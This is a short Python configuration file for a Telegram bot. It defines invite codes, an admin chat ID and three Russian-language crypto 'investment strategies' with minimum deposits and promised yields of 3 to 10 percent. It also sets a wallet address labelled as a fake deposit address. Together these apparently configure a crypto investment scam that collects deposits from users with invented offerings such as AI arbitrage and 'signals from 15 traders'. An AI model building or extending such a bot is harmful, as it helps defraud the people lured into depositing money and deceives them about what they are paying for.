import os
from dotenv import load_dotenv

load_dotenv()

# Telegram Bot Configuration
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_CHAT_ID =-4827638107

# Invite codes (можно добавить несколько)
INVITE_CODES = ['DSA28321fhs']

# Strategy configurations
STRATEGIES = {
    'ai_arbitrage': {
        'name': 'AI-арбитраж',
        'min_deposit': 500,
        'max_yield': 8,
        'description': 'Автоматизированный арбитраж на основе ИИ'
    },
    'liquidity_pools': {
        'name': 'Пулы ликвидности',
        'min_deposit': 250,
        'max_yield': 3,
        'description': 'Доходность от предоставления ликвидности'
    },
    'analyst_signals': {
        'name': 'Сигналы от команды аналитиков',
        'min_deposit': 1000,
        'max_yield': 10,
        'description': 'Эксклюзивные сигналы от 15 трейдеров и аналитиков'
    }
}

# Fake deposit address
FAKE_DEPOSIT_ADDRESS = "0xe660c2200921f60613d88d11b4215034bbeB7469"

# Database
DATABASE_PATH = "hydra_bot.db" 